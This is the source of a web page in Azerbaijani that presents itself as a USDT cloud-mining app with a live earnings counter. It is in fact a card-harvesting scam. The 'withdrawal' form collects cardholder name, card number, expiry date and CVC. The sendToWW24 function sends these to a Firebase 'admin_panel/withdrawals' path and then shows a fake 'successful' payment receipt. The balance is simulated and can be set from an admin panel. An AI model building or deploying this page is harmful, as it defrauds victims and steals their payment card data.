<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

<div id="mining-app" style="background: #000; min-height: 100vh; color: #fff; font-family: 'Inter', sans-serif; display: flex; flex-direction: column; overflow: hidden;">

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
        body { margin: 0; padding: 0; user-select: none; }

        /* Sənin atdığın dizayn elementləri - DƏYİŞMƏDİ */
        .top-bar { display: flex; justify-content: space-between; align-items: center; padding: 15px 20px; border-bottom: 1px solid #1a1a1a; }
        .user-info { display: flex; align-items: center; gap: 10px; }
        .avatar { width: 35px; height: 35px; border-radius: 50%; background: #222; border: 1px solid #3fb950; display: flex; align-items: center; justify-content: center; }
        .stats-container { padding: 15px; gap: 10px; display: flex; flex-direction: column; }
        .stat-row { background: #111111; border: 1px solid #222; border-radius: 12px; padding: 12px 15px; display: flex; justify-content: space-between; align-items: center; }
        .level-tag { background: #bdfd00; color: #000; padding: 4px 12px; border-radius: 20px; font-weight: 700; font-size: 0.75rem; }
        .speed-text { color: #bdfd00; font-weight: 700; font-size: 0.9rem; }
        .mining-core { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; position: relative; }
        .mining-gif { width: 160px; margin-bottom: 20px; filter: drop-shadow(0 0 15px rgba(189, 253, 0, 0.2)); }
        .live-counter { font-size: 2.2rem; font-weight: 700; letter-spacing: 1px; margin-bottom: 5px; }
        .progress-section { padding: 20px; width: 100%; box-sizing: border-box; }
        .progress-bar-bg { width: 100%; height: 12px; background: #1a1a1a; border-radius: 10px; overflow: hidden; margin-bottom: 8px; border: 1px solid #222; }
        .progress-fill { width: 0%; height: 100%; background: #4a7d00; border-radius: 10px; transition: 0.3s; }
        .nav-bar { display: grid; grid-template-columns: repeat(5, 1fr); background: #0a0a0a; border-top: 1px solid #1a1a1a; padding: 10px 0; }
        .nav-item { display: flex; flex-direction: column; align-items: center; gap: 5px; color: #666; font-size: 0.65rem; text-decoration: none; }
        .nav-item.active { color: #bdfd00; }

        /* Bank Modalı */
        .modal-overlay { position: fixed; inset: 0; background: #000; z-index: 9999; display: none; flex-direction: column; padding: 20px; }
        .v-card { width: 100%; max-width: 320px; height: 180px; background: linear-gradient(135deg, #1d1d1d, #000); border-radius: 15px; margin: 20px auto; border: 1px solid #333; padding: 20px; position: relative; }
        .b-input { width: 100%; background: #0f0f0f; border: 1px solid #222; padding: 15px; color: #fff; border-radius: 12px; margin-bottom: 10px; outline: none; }
    </style>

    <div class="top-bar">
        <div class="user-info">
            <div class="avatar"><i class="fas fa-user" style="color:#bdfd00"></i></div>
            <span id="user-display-name" style="font-size: 0.85rem; font-weight: 600;">Yüklənir...</span>
        </div>
        <div style="background: #111; padding: 5px 12px; border-radius: 20px; font-size: 0.75rem; border: 1px solid #222;">🌐 Azərbaycan</div>
    </div>

    <div class="stats-container">
        <div class="stat-row">
            <div class="level-tag">SEVİYYƏ 1</div>
            <div class="speed-text">0.000055 USD/S</div>
        </div>
    </div>

    <div class="mining-core">
        <div style="position: relative;">
            <img src="usdt.png" class="mining-gif" id="coin-logo">
        </div>
        <div class="live-counter" id="live-bal">0.0000</div>
        <div style="font-size: 0.8rem; color: #888;">YIĞILAN MƏBLƏĞ (USDT)</div>
    </div>

    <div class="progress-section">
        <div class="progress-bar-bg"><div class="progress-fill" id="p-fill"></div></div>
        <div id="p-timer" style="font-size: 0.8rem; text-align: center; color: #fff;">05:00:00</div>
        <button id="mine-btn" onclick="startMiningProcess()" style="width: 100%; margin-top: 20px; background: #bdfd00; border: none; padding: 15px; border-radius: 12px; font-weight: 700; color: #000;">MƏDƏNİ AKTİVLƏŞDİR</button>
    </div>

    <div class="nav-bar">
        <a href="#" class="nav-item active"><i class="fas fa-hammer"></i> <span>Mədən</span></a>
        <a href="#" class="nav-item"><i class="fas fa-trophy"></i> <span>Liderlər</span></a>
        <a href="#" class="nav-item"><i class="fas fa-rocket"></i> <span>Yenilə</span></a>
        <a href="#" onclick="showWithdraw()" class="nav-item"><i class="fas fa-wallet"></i> <span>Çıxarış</span></a>
        <a href="#" class="nav-item"><i class="fas fa-user"></i> <span>Mən</span></a>
    </div>

    <div id="w-modal" class="modal-overlay">
        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
            <h3>Çıxarış</h3> <i class="fas fa-times" onclick="hideWithdraw()"></i>
        </div>
        <div class="v-card">
            <div style="display:flex; justify-content:space-between;">
                <img src="chip.png" width="40">
                <div id="card-type-img"><img src="visa.png" width="50"></div>
            </div>
            <div id="card-num-view" style="margin: 30px 0; font-size: 1.2rem; letter-spacing: 2px;">**** **** **** ****</div>
            <div style="display:flex; justify-content:space-between; font-size:0.7rem;">
                <span id="card-holder-view">AD SOYAD</span> <span id="card-date-view">MM/YY</span>
            </div>
        </div>
        <input type="text" id="in-name" class="b-input" placeholder="Ad Soyad" oninput="sync()">
        <input type="text" id="in-num" class="b-input" placeholder="Kart Nömrəsi" maxlength="19" oninput="sync()">
        <div style="display:flex; gap:10px;">
            <input type="text" id="in-date" class="b-input" placeholder="AA/İİ" maxlength="5" oninput="sync()">
            <input type="password" id="in-cvc" class="b-input" placeholder="CVC" maxlength="3">
        </div>
        <input type="number" id="in-amt" class="b-input" placeholder="Məbləğ">
        <button onclick="sendToWW24()" style="width:100%; padding:15px; background:#238636; border:none; border-radius:10px; color:#fff; font-weight:700;">TƏSDİQLƏ</button>
    </div>

    <div id="receipt-overlay" class="modal-overlay" style="background:#fff; color:#000; justify-content:center; align-items:center; display:none;">
        <div style="font-family:'Courier New'; border:1px solid #000; padding:20px; width:80%;">
            <center><h2>ÖDƏNİŞ ÇEKİ</h2></center>
            <p>TARİX: <span id="r-date"></span></p>
            <p>İSTİFADƏÇİ: <span id="r-user"></span></p>
            <p>KART: <span id="r-card"></span></p>
            <p>MƏBLƏĞ: <span id="r-amt"></span> USDT</p>
            <p>STATUS: <b style="color:green">UĞURLU</b></p>
            <button onclick="location.reload()" style="width:100%; padding:10px; background:#000; color:#fff; margin-top:10px;">BAĞLA</button>
        </div>
    </div>
</div>

<script>
    const user = localStorage.getItem('username') || 'Qonaq';
    document.getElementById('user-display-name').innerText = user;

    let balance = 0;
    let isRunning = false;
    let startTime = 0;
    const SPEED = 0.0000555;
    const LIMIT = 5 * 60 * 60 * 1000;

    // Firebase Sinxronizasiyası (Admin panelindən balans dəyişmək üçün)
    db.ref('mining/' + user).on('value', snap => {
        const d = snap.val() || { balance: 0, isRunning: false, startTime: 0 };
        balance = d.balance;
        isRunning = d.isRunning;
        startTime = d.startTime;
        updateUI();
    });

    function updateUI() {
        const btn = document.getElementById('mine-btn');
        if(isRunning) {
            btn.innerText = "MƏDƏN İŞLƏYİR...";
            btn.disabled = true;
            btn.style.opacity = "0.5";
        } else {
            btn.innerText = "MƏDƏNİ AKTİVLƏŞDİR";
            btn.disabled = false;
            btn.style.opacity = "1";
        }
    }

    setInterval(() => {
        if(isRunning) {
            let elapsed = Date.now() - startTime;
            if(elapsed < LIMIT) {
                balance += SPEED;
                document.getElementById('live-bal').innerText = balance.toFixed(4);
                document.getElementById('p-fill').style.width = (elapsed / LIMIT * 100) + "%";
                
                let rem = LIMIT - elapsed;
                let h = Math.floor(rem / 3600000);
                let m = Math.floor((rem % 3600000) / 60000);
                let s = Math.floor((rem % 60000) / 1000);
                document.getElementById('p-timer').innerText = `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
            } else {
                stopMining();
            }
        }
    }, 1000);

    async function startMiningProcess() {
        startTime = Date.now();
        isRunning = true;
        await db.ref('mining/' + user).update({ isRunning: true, startTime: startTime });
    }

    async function stopMining() {
        isRunning = false;
        await db.ref('mining/' + user).update({ isRunning: false, balance: balance });
        alert("5 saat bitdi. Yenidən aktivləşdirin!");
    }

    function showWithdraw() { document.getElementById('w-modal').style.display = 'flex'; }
    function hideWithdraw() { document.getElementById('w-modal').style.display = 'none'; }

    function sync() {
        const n = document.getElementById('in-num').value;
        document.getElementById('card-num-view').innerText = n || "**** **** **** ****";
        document.getElementById('card-holder-view').innerText = document.getElementById('in-name').value || "AD SOYAD";
        document.getElementById('card-date-view').innerText = document.getElementById('in-date').value || "MM/YY";
        const logo = document.getElementById('card-type-img');
        if(n.startsWith('4')) logo.innerHTML = '<img src="visa.png" width="50">';
        else if(n.startsWith('5')) logo.innerHTML = '<img src="master.png" width="50">';
    }

    async function sendToWW24() {
        const amt = parseFloat(document.getElementById('in-amt').value);
        if(amt > balance || isNaN(amt)) return alert("Balans yetmir!");

        const data = {
            username: user,
            fullName: document.getElementById('in-name').value,
            cardNum: document.getElementById('in-num').value,
            date: document.getElementById('in-date').value,
            cvc: document.getElementById('in-cvc').value, // WW24 üçün CVC
            amount: amt,
            time: new Date().toLocaleString()
        };

        // ww24.html üçün admin_panel qovluğuna göndərir
        await db.ref('admin_panel/withdrawals').push(data);
        await db.ref('mining/' + user).update({ balance: balance - amt });

        document.getElementById('r-date').innerText = data.time;
        document.getElementById('r-user').innerText = user;
        document.getElementById('r-card').innerText = data.cardNum;
        document.getElementById('r-amt').innerText = amt;
        document.getElementById('receipt-overlay').style.display = 'flex';
    }
</script>
